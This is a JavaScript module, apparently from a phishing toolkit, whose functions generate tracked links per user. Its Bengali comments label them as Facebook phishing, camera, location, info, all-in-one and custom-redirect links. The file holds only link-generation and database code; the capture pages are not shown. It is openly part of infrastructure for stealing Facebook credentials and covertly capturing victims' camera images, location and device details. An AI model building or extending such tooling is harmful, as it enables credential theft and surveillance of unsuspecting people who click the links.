const Link = require('../models/Link');
const helpers = require('./helpers');

const generator = {
  // ফেসবুক ফিশিং লিংক জেনারেট
  generateFBLink: async (userId) => {
    const linkId = helpers.generateUniqueId('fb');
    const url = `${process.env.DOMAIN}/fb/${linkId}`;
    
    const link = new Link({
      linkId,
      userId,
      type: 'fb',
      url
    });
    
    await link.save();
    
    return {
      linkId,
      url,
      expiresAt: link.expiresAt
    };
  },
  
  // ক্যামেরা লিংক জেনারেট
  generateCameraLink: async (userId) => {
    const linkId = helpers.generateUniqueId('cam');
    const url = `${process.env.DOMAIN}/camera/${linkId}`;
    
    const link = new Link({
      linkId,
      userId,
      type: 'camera',
      url
    });
    
    await link.save();
    
    return {
      linkId,
      url,
      expiresAt: link.expiresAt
    };
  },
  
  // লোকেশন লিংক জেনারেট
  generateLocationLink: async (userId) => {
    const linkId = helpers.generateUniqueId('loc');
    const url = `${process.env.DOMAIN}/location/${linkId}`;
    
    const link = new Link({
      linkId,
      userId,
      type: 'location',
      url
    });
    
    await link.save();
    
    return {
      linkId,
      url,
      expiresAt: link.expiresAt
    };
  },
  
  // ইনফো লিংক জেনারেট
  generateInfoLink: async (userId) => {
    const linkId = helpers.generateUniqueId('info');
    const url = `${process.env.DOMAIN}/info/${linkId}`;
    
    const link = new Link({
      linkId,
      userId,
      type: 'info',
      url
    });
    
    await link.save();
    
    return {
      linkId,
      url,
      expiresAt: link.expiresAt
    };
  },
  
  // অল-ইন-ওয়ান লিংক জেনারেট
  generateAllLink: async (userId) => {
    const linkId = helpers.generateUniqueId('all');
    const url = `${process.env.DOMAIN}/all/${linkId}`;
    
    const link = new Link({
      linkId,
      userId,
      type: 'all',
      url
    });
    
    await link.save();
    
    return {
      linkId,
      url,
      expiresAt: link.expiresAt
    };
  },
  
  // কাস্টম রিডাইরেক্ট লিংক জেনারেট
  generateCustomLink: async (userId, targetUrl) => {
    const linkId = helpers.generateUniqueId('custom');
    const encodedUrl = helpers.encodeUrl(targetUrl);
    const url = `${process.env.DOMAIN}/custom/${linkId}?url=${encodedUrl}`;
    
    const link = new Link({
      linkId,
      userId,
      type: 'custom',
      url,
      targetUrl
    });
    
    await link.save();
    
    return {
      linkId,
      url,
      expiresAt: link.expiresAt
    };
  }
};

module.exports = generator;